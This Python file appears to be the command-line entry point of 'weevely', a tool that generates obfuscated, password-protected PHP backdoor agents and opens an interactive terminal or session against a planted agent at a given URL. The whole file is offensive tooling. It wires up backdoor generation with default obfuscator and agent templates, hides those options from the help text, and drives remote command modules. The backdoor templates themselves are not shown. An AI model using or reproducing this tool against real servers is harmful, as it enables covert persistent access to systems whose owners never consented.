#!/usr/bin/env python
from core.terminal import Terminal
from core.weexceptions import FatalException
from core.loggers import log
from core.sessions import SessionURL, SessionFile
from core.config import agent_templates_folder_path, obfuscators_templates_folder_path
from core import generate
from core import modules
from core import messages
from core.argparsers import CliParser, SUPPRESS
import pprint
import glob
import os
import sys

def main(arguments):

    if arguments.command == 'generate':

        obfuscated = generate.generate(
            password = arguments.password,
            obfuscator = arguments.obfuscator,
            agent = arguments.agent
        )

        generate.save_generated(obfuscated, arguments.path)

        log.info(
        messages.generate.generated_backdoor_with_password_s_in_s_size_i %
        (arguments.password, arguments.path, len(obfuscated))
        )

        return

    elif arguments.command == 'terminal':
        session = SessionURL(
            url = arguments.url,
            password = arguments.password
        )

    elif arguments.command == 'session':
        session = SessionFile(arguments.path)

    log.debug(
        pprint.pformat(session)
    )

    modules.load_modules(session)
    Terminal(session).cmdloop()

if __name__ == '__main__':

    parser = CliParser(prog='weevely')
    subparsers = parser.add_subparsers(dest = 'command')

    terminalparser = subparsers.add_parser('terminal', help='Run terminal')
    terminalparser.add_argument('url', help = 'The agent URL')
    terminalparser.add_argument('password', help = 'The agent password')

    sessionparser = subparsers.add_parser('session', help='Recover an existant a session file')
    sessionparser.add_argument('path', help = 'The session file to load')

    agents_available = [
        os.path.split(agent)[1].split('.')[0] for agent in
        glob.glob('%s/*.tpl' % agent_templates_folder_path)
    ]

    obfuscators_available = [
        os.path.split(agent)[1].split('.')[0] for agent in
        glob.glob('%s/*.tpl' % obfuscators_templates_folder_path)
    ]

    generateparser = subparsers.add_parser('generate', help='Generate a new password')
    generateparser.add_argument('password', help = 'The agent password')
    generateparser.add_argument('path', help = 'Where save the generated agent')
    generateparser.add_argument(
        '-obfuscator',
        help = SUPPRESS, #The obfuscation method
        choices = obfuscators_available,
        default = 'obfusc1_php'
        )
    generateparser.add_argument(
        '-agent',
        help = SUPPRESS, #The agent channel type
        choices = agents_available,
        default = 'stegaref_php'
        )

    parser.set_default_subparser('terminal')

    arguments = parser.parse_args()

    try:
        main(arguments)
    except (KeyboardInterrupt, EOFError):
        log.info('Exiting.')
    except FatalException as e:
        log.critical('Exiting: %s' % e)
